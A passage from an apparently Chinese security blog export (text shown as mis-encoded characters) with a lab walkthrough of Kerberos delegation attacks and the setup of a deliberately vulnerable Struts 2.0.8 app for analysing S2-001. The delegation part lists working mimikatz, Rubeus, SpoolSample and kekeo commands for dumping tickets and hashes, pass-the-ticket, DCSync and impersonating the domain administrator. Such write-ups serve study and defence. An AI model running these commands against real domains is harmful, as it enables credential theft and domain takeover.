<h2 id="çº¦æŸå§”æ´¾"><a href="#çº¦æŸå§”æ´¾" class="headerlink" title="çº¦æŸå§”æ´¾"></a>çº¦æŸå§”æ´¾</h2><p>çº¦æŸå§”æ´¾é‡Œé¢æœ‰ä¸¤ç§é‡è¦çš„åè®®ä¸€ç§å«S4U2Proxyï¼Œä¸€ç§å«S4U2Selfã€‚å‡å¦‚åœ¨ç»™server1ä¸»æœºè´¦æˆ·é…ç½®äº†å§”æ´¾åˆ°çš„server2 service2æœåŠ¡ã€‚é‚£ä¹ˆå½“åŸŸç”¨æˆ·Aä¸server1æ——ä¸‹çš„service1å‘ç”Ÿkerberosè®¤è¯çš„æ—¶å€™ï¼Œservice1å¯ä»¥æ‹¿åŸŸç”¨æˆ·Aç»™çš„tgs1ä»åŸŸæ§æ¢åˆ°å¯ä»¥è®¿é—®server2 service2çš„tgs2ã€‚åœ¨ç”¨tgs1æ¢tgs2çš„è¿‡ç¨‹ä¸­ä½¿ç”¨çš„åè®®å°±æ˜¯S4U2Proxyã€‚å¯æ˜¯æœ‰å¯èƒ½ç”¨æˆ·Aä»¥å…¶ä»–æ–¹å¼(å¦‚NTLMè®¤è¯ï¼ŒåŸºäºè¡¨å•çš„è®¤è¯ç­‰æ–¹å¼)ä¸server service1 è®¤è¯åç”¨æˆ·æ²¡æ³•æä¾›tgsï¼Œé‚£ä¹ˆservice1å°±å…ˆéœ€è¦ä½¿ç”¨S4U2Selfä»åŸŸæ§é‚£é‡Œå…ˆæ¢åˆ°ç”¨æˆ·å¯¹è‡ªå·±æœåŠ¡çš„tgs1ï¼Œå†ä½¿ç”¨S4U2Proxyæ¢å¯ä»¥è®¿é—®server2 service2çš„tgs2ã€‚</p>
<p>S4U2Proxyçš„ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1570712520459.png" alt="Alt text"></p>
<p>S4U2Selfçš„ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1570712530920.png" alt="Alt text"></p>
<p>å…¶æ”»å‡»é¢æ˜¯å¦‚æœé»‘å®¢æ§åˆ¶äº†server1é‚£ä¹ˆä»–å¯ä»¥ä¼ªé€ åŸŸå†…ä»»æ„ç”¨æˆ·è®¿é—®server2çš„service2</p>
<h3 id="ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾"><a href="#ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾" class="headerlink" title="ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾"></a>ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾</h3><p>ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾æ˜¯â€œæ­£å‘çš„â€ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡Aå±æ€§<code>msDS-AllowedToDelegateTo</code>ï¼Œæ·»åŠ æœåŠ¡Bçš„SPNï¼ˆService Principle Nameï¼‰ï¼Œè®¾ç½®çº¦æŸå§”æ´¾å¯¹è±¡ï¼ˆæœåŠ¡Bï¼‰ï¼ŒæœåŠ¡Aä¾¿å¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å‘åŸŸæ§åˆ¶å™¨è¯·æ±‚è®¿é—®æœåŠ¡Bä»¥è·å¾—æœåŠ¡ç¥¨æ®ï¼ˆTGSï¼‰æ¥ä½¿ç”¨æœåŠ¡Bçš„èµ„æºã€‚</p>
<h3 id="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</h3><p>2012 åŠä»¥åçš„KDCï¼Œå—é™å§”æ´¾çš„æœºåˆ¶å˜æˆäº†åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åˆ™æ˜¯ç›¸åçš„ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡Bå±æ€§<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>ï¼Œæ·»åŠ æœåŠ¡Açš„SPNï¼Œè¾¾åˆ°è®©æœåŠ¡Aæ¨¡æ‹Ÿç”¨æˆ·è®¿é—®Bèµ„æºçš„ç›®çš„ã€‚</p>
<p>ä¸¤è€…è”ç³»ä¸åŒºåˆ«ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1569689280607.png" alt="Alt text"> </p>
<h2 id="å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·"><a href="#å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·" class="headerlink" title="å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·"></a>å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·</h2><p>åœ¨åŸŸå†…çš„å¯ä»¥å§”æ´¾çš„è´¦æˆ·æœ‰ä¸¤ç§ä¸€ç§æ˜¯ä¸»æœºè´¦æˆ·ï¼ˆNetComputerï¼‰å¦ä¸€ç§æ˜¯ç”¨setspnæ‰‹åŠ¨æ·»åŠ çš„æœåŠ¡è´¦æˆ·ï¼ˆNetUserï¼‰ï¼Œä¸Šæ–‡ä¸­ä¸ç®¡æ˜¯éçº¦æŸè¿˜æ˜¯çº¦æŸçš„ä¾‹å­æ˜¯ä»¥ä¸»æœºè´¦æˆ·ä¸¾ä¾‹ï¼Œå› ä¸ºç”¨ä¸»æœºè´¦æˆ·æ¥å§”æ´¾çš„ç¯å¢ƒå¥½æ­å¹¶ä¸”ä¾¿äºç†è§£ï¼Œä¸è¿‡æœåŠ¡è´¦æˆ·å’Œä¸»æœºè´¦æˆ·ä»æ”»å‡»å§”æ´¾è¿™ä¸ªè§†è§’æ¥çœ‹æ˜¯ç­‰ä»·çš„ã€‚</p>
<p>æ£€æŸ¥éçº¦æŸå§”æ´¾å¯ä»¥ä½¿ç”¨masterç‰ˆçš„PowerView<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain beta.com</span><br><span class="line">Get-NetComputer -Unconstrained -Domain beta.com</span><br></pre></td></tr></table></figure>

<p>æ£€æŸ¥çº¦æŸå§”æ´¾å¯ä»¥ä½¿ç”¨å¼€å‘ç‰ˆçš„PowerView<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-DomainUser -TrustedToAuth -Domain beta.com</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain beta.com</span><br></pre></td></tr></table></figure>

<h2 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h2><p>WIN-PMID8H9A6H0 192.168.3.2ï¼ˆåŸŸæ§ï¼Œ server2012ï¼‰<br>exchange 192.168.3.3 (server2012)<br>database 192.168.3.4 (win10)<br>database2 192.168.3.5 (win7)</p>
<h2 id="æ”»å‡»éçº¦æŸå§”æ´¾"><a href="#æ”»å‡»éçº¦æŸå§”æ´¾" class="headerlink" title="æ”»å‡»éçº¦æŸå§”æ´¾"></a>æ”»å‡»éçº¦æŸå§”æ´¾</h2><p>åœ¨WIN-PMID8H9A6H0ä¸Šç”¨åŸŸç®¡ç™»é™†ï¼ˆè¿™æ˜¯ä¸€å¥åºŸè¯ï¼Œé»˜è®¤æƒ…å†µåªæœ‰åŸŸç®¡å¯ä»¥ç™»é™†åŸŸæ§ï¼‰ï¼Œåœ¨Active Directoryç”¨æˆ·å’Œè®¡ç®—æœºä¸­ï¼Œå°†computerç»„é‡Œé¢çš„database2é€‰ä¸º<em>ä¿¡ä»»æ­¤è®¡ç®—æœºæ¥å§”æ´¾ä»»ä½•æœåŠ¡</em>å³éçº¦æŸå§”æ´¾ã€‚ç„¶ååœ¨cmdä¸­<code>dir \\database2\c$</code>ã€‚<br><img src="./1570709429377.png" alt="Alt text"></p>
<p>åœ¨database2ä¸Šç”¨æœ¬åœ°ç®¡ç†å‘˜ç™»é™†å¹¶ç”¨mimikatzæŠ“å–tickets</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot; exit</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°åŸŸç®¡ç†å‘˜ä¼ æ¥çš„tgt<br><img src="./1570709452890.png" alt="Alt text"></p>
<p>ç”¨mimikatzå°†åŸŸç®¡ç†å‘˜çš„tgtå¯¼å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;a4e7f]-2-0-60a10000-Administrator@krbtgt-BETA.COM.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
<p><img src="./1570709549303.png" alt="Alt text"><br><img src="./1570709591012.png" alt="Alt text"></p>
<p>æœ¬åœ°ç®¡ç†å‘˜æˆåŠŸè®¿é—®åŸŸæ§<br><img src="./1570709682895.png" alt="Alt text"></p>
<h2 id="æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰"><a href="#æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰" class="headerlink" title="æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰"></a>æ”»å‡»éçº¦æŸå§”æ´¾ï¼ˆè¿›é˜¶ï¼‰</h2><p>ä¸Šé¢åˆ©ç”¨éçº¦æŸå§”æ´¾æ‹¿åˆ°åŸŸç®¡è´¦æˆ·TGTçš„å‰ææ˜¯éœ€è¦åŸŸç®¡è´¦æˆ·å’Œå§”æ´¾ä¸»æœºæœ‰è¿‡äº¤äº’æ‰èƒ½è·å–åˆ°TGTã€‚å½“åŸŸæ§æœºå™¨å¼€å¯Print SpooleræœåŠ¡æ—¶(é»˜è®¤å¼€å¯ä¸”ä»¥Systemæƒé™è¿è¡Œ)ï¼Œæ”»å‡»è€…å¯ä»¥ä¸»åŠ¨è¦æ±‚åŸŸæ§è®¿é—®å·²è¢«æ”»å‡»è€…æ§åˆ¶çš„éå—é™å§”æ´¾æœåŠ¡å™¨ï¼Œè¿›è€Œè·å–åŸŸæ§ä¸»æœºè´¦æˆ·çš„TGTã€‚å½“ç„¶è¿™ç§æ”»å‡»æ–¹å¼ä¹Ÿé€‚ç”¨äºå…¶ä»–éåŸŸæ§æœºå™¨ã€‚<strong>ä½†æ˜¯è¿™ç§æ”»å‡»æœ‰ä¸€ä¸ªé™åˆ¶æ˜¯éœ€è¦æ‰¾åˆ°ä¸€å°å¼€å¯éå—é™å§”æ´¾çš„ä¸»æœºè´¦æˆ·ï¼Œè€ŒéæœåŠ¡è´¦æˆ·å¹¶ä¸”æœ‰ä¸€ä¸ªåŸŸæ™®é€šè´¦æˆ·</strong></p>
<p><img src="./1570777540500.png" alt="Alt text"></p>
<p>å®Œæˆè¿™ä¸€å¥—æ”»å‡»éœ€è¦ä¸¤ä¸ª<a href="https://github.com/GhostPack/Rubeus">Rubeus</a>å’Œ<a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>çš„å·¥å…·ï¼ŒRubeuså¯ä»¥çœ‹ä½œå¯¹kekeoçš„å¼¥è¡¥ï¼ŒSpoolSampleç”¨æˆ·å‘DC2 Print Spoolerå‘èµ·è¯·æ±‚ã€‚SpoolSampleè²Œä¼¼åªèƒ½ç”¨.net4.0ä»¥ä¸Šçš„ç‰ˆæœ¬ç¼–è¯‘ï¼Œæ‰€ä»¥è¿™æ¬¡å°±åœ¨win10ä¸Šç”¨äº†ã€‚<br>æœ¬åœ°ç®¡ç†å‘˜è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:WIN-PMID8H9A6H0$</span><br></pre></td></tr></table></figure>
<p><img src="./1570850050489.png" alt="Alt text"></p>
<p>åŸŸæ™®é€šè´¦æˆ·è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SpoolSample.exe WIN-PMID8H9A6H0 database2</span><br></pre></td></tr></table></figure>
<p><img src="./1570850068279.png" alt="Alt text"><br>å›°æƒ‘çš„æ˜¯è¿™é‡ŒæŠ¥é”™äº†ï¼ŒæŸ¥äº†æŠ¥é”™ç è¯´æ˜¯Print Spooleræ²¡å¼€ï¼Œä½†æ˜¯æ˜æ˜å¼€äº†çš„ã€‚ã€‚ã€‚<br>ä¸è¿‡å³°å›è·¯è½¬çš„æ˜¯database2 ä¸Šå¯ä»¥æŠ“åˆ°åŸŸæ§ä¼ æ¥çš„tgt<br><img src="./1570868278901.png" alt="Alt text"><br><img src="./1570868800619.png" alt="Alt text"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt [0;a8543]-2-0-60a10000-WIN-PMID8H9A6H0$@krbtgt-BETA.COM.kirbi</span><br><span class="line">lsadump::dcsync &#x2F;domain:beta.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>
<p><img src="./1570871508561.png" alt="Alt text"></p>
<h2 id="æ”»å‡»çº¦æŸå§”æ´¾"><a href="#æ”»å‡»çº¦æŸå§”æ´¾" class="headerlink" title="æ”»å‡»çº¦æŸå§”æ´¾"></a>æ”»å‡»çº¦æŸå§”æ´¾</h2><p>åŸŸæ§ä¸Šè¿™ä¹ˆé…ç½®<br><img src="./1570713945685.png" alt="Alt text"></p>
<p>åœ¨database2ä¸Šç”¨mimikatzæŠ“å–ä¸»æœºè´¦æˆ·htlm hashï¼ˆä¸»æœºè´¦æˆ·å³hostname$ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
<p><img src="./1570701745743.png" alt="Alt text"></p>
<p>ç”¨æ‹¿åˆ°çš„ntlm hashç”³è¯·tgt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:database2$ &#x2F;domain:beta.com &#x2F;ntlm:65118c9246cada2aa3e1a366f3ed06cf</span><br></pre></td></tr></table></figure>
<p><img src="./1570702323339.png" alt="Alt text"></p>
<p><em>psï¼šå…¶å®æŠ“hashå’Œkekeoçš„æ“ä½œåœ¨æ‹¥æœ‰database2ä¸»æœºæƒé™ä¸‹éƒ½æ˜¯å¤šä½™çš„æ“ä½œã€‚è¿™é‡Œä¸ºäº†å®Œæ•´æ€§å†™å‡ºæ¥ï¼Œå…¶å®é™…æ„ä¹‰åœ¨äºåœ¨å®æˆ˜ä¸­é€šè¿‡å…¶ä»–æ–¹å¼ä¾‹å¦‚çˆ†ç ´è·å–äº†æœåŠ¡è´¦å·çš„å¯†ç ï¼ˆæœåŠ¡è´¦å·çš„å¯†ç æ˜¯ç®¡ç†å‘˜è‡ªå·±è®¾ç½®æ‰€ä»¥å¯èƒ½æ˜¯å¼±å£ä»¤ï¼Œè‡³äºä¸»æœºè´¦æˆ·çš„å¯†ç ä¸Šä¸Šå¼ å›¾ä½ ä¹Ÿçœ‹åˆ°äº†é•¿çš„è¿‡åˆ†ï¼‰çš„æƒ…å†µä¸‹è¿›è¡Œçº¦æŸå§”æ´¾æ”»å‡»ã€‚</em></p>
<p>è·å–è®¿é—®exchange cifsæœåŠ¡çš„tgsï¼ˆtgsæ˜¯åŸŸç®¡æƒé™ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgs::s4u &#x2F;tgt:TGT_database2$@BETA.COM_krbtgt~beta.com@BETA.COM.kirbi &#x2F;user:Administrator@beta.com &#x2F;service:cifs&#x2F;exchange.beta.com</span><br></pre></td></tr></table></figure>
<p><img src="./1570702415606.png" alt="Alt text"></p>
<p>å°†tgså¯¼å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@beta.com@BETA.COM_cifs~exchange.beta.com@BETA.COM.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="./1570702431480.png" alt="Alt text"></p>
<p>ä»¥æœ¬åœ°ç®¡ç†å‘˜èº«ä»½å‡è£…åŸŸç®¡è®¿é—®exchange smb<br><img src="./1570702480513.png" alt="Alt text"></p>
<h2 id="æ‚"><a href="#æ‚" class="headerlink" title="æ‚"></a>æ‚</h2><ul>
<li>é»˜è®¤æƒ…å†µä¸‹æ™®é€šåŸŸç”¨æˆ·åªèƒ½ç™»é™†åŸŸä¸­çš„PCä¸èƒ½ç™»é™†åŸŸä¸­server</li>
<li>tgtä½¿ç”¨ä¸åŸŸè´¦å·æ— å…³ï¼Œæœ¬åœ°è´¦æˆ·ä»ç„¶å¯ä»¥ä½¿ç”¨tgt</li>
<li>tgtæ˜¯ä»æœ¬è´¨æ¥è¯´æ˜¯krbtgtæœåŠ¡çš„tgs</li>
</ul>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.html">åŸŸæ¸—é€-Delegation</a><br><a href="http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/">åˆ©ç”¨èµ„æºçº¦æŸå§”æ´¾è¿›è¡Œçš„ææƒæ”»å‡»åˆ†æ</a><br><a href="https://paper.seebug.org/620/">åˆ©ç”¨ Kerberos delegation æ‰“é€ å˜ç§é»„é‡‘ç¥¨æ®</a><br><a href="https://pathowe.co.uk/delegation-between-servers-windows-authenticated-sites/">Setting up delegation between servers for Windows authenticated sites</a><br><a href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a><br><a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md">N1CTF 2019 Pentest N1ctf2019.lab WP</a><br><a href="https://blogs.msdn.microsoft.com/apgcdsd/2011/09/26/kerberosntlm-sql-server/">Kerberoså’ŒNTLM â€“ SQL Serverè¿æ¥çš„é‚£ç‚¹äº‹</a><br><a href="https://blog.csdn.net/yxwmzouzou/article/details/79002677">SQL Server åªå®‰è£…å®¢æˆ·ç«¯çš„æ–¹æ³•</a></p>
]]></content>
      <categories>
        <category>ad security</category>
      </categories>
      <tags>
        <tag>kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>s2-001 ä»£ç åˆ†æ</title>
    <url>/2019/10/09/s2-001%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- more -->

<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><img src="./1570086393603.png" alt="Alt text"></p>
<p><img src="./1570086655844.png" alt="Alt text"></p>
<p>pom.xmlä¸­åŠ å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt;</span><br><span class="line">  &lt;version&gt;2.0.8&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
<p><img src="./1570086841119.png" alt="Alt text"></p>
<p><img src="./1570086870550.png" alt="Alt text"></p>
<p><img src="./1570086949529.png" alt="Alt text"></p>
<p>index.jsp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>welcome.jsp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>struts.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">"http://struts.apache.org/dtds/struts-2.0.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"s2-001"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.example.s2001.LoginAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>LoginAction.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.s2001;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="./1570535595262.png" alt="Alt text"></p>
<p><img src="./1570087619139.png" alt="Alt text"><br>è®¿é—® <a href="http://localhost:8888/s2_001_war_exploded/">http://localhost:8888/s2_001_war_exploded/</a><br><img src="./1570088616630.png" alt="Alt text"></p>
